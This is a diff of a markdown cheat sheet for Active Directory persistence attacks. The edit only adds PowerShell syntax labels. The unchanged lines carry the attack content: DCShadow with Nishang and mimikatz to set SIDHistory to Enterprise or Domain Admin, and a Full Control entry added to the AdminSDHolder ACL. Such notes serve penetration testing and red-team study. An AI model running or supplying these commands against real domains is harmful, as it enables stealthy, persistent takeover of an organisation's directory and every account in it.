@@ -48,8 +48,10 @@ token::whoami
 
 **Using Nishang to set minimal Permissions to target object / Use DCShadow as user currentuser to modify username1 object from machine attacker-machine-hostname**
 
+
+
 {% code overflow="wrap" %}
-```
+```powershell
 Set-DCShadowPermissions -FakeDC attacker-machine-hostname -samaccountname username1 -username currentuser -verbose 
 ==> now only 1 Mimikatz sessions is requried because username1 can be used and only do lsadump::dcshadow /push
 ```
@@ -58,7 +60,7 @@ Set-DCShadowPermissions -FakeDC attacker-machine-hostname -samaccountname userna
 **Once we have permissions, set SIDHistory of a user account to Enterprise Admin or Domain Admin**&#x20;
 
 {% code overflow="wrap" %}
-```
+```powershell
 lsadump::dcshadow /object:user1 /attribute:SIDHistory /value:S-1-5......
 
 To use without DA, see above:
@@ -78,7 +80,7 @@ Note: The user show up as member of EA in some enumeration like net group "Enter
 
 **Modify ntSecurityDescriptor for AdminSDHolder to add Full Fontrol for a User**
 
-<pre data-overflow="wrap"><code>Get the current ACL for AdminSDHolder:
+<pre class="language-powershell" data-overflow="wrap"><code class="lang-powershell">Get the current ACL for AdminSDHolder:
 (New-Object System.DirectoryServices.DirectoryEntry("LDAP://CN=AdminSDHolder,CN=System,DC=dom,DC=local")).psbase.ObjectSecurity.sddl
 
 Just need to append a Full Control ACE from above for SY/BA/DA with our users SID at the end 
@@ -88,7 +90,7 @@ Just need to append a Full Control ACE from above for SY/BA/DA with our users SI
 **Shadowception - Run DCShadow from DCShadow itself**&#x20;
 
 {% code overflow="wrap" %}
-```
+```powershell
 Get the current ACL for the domain:
 (New-Object System.DirectoryServices.DirectoryEntry("LDAP://DC=dom,DC=local")).psbase.ObjectSecurity.sddl | set-clipboard
 
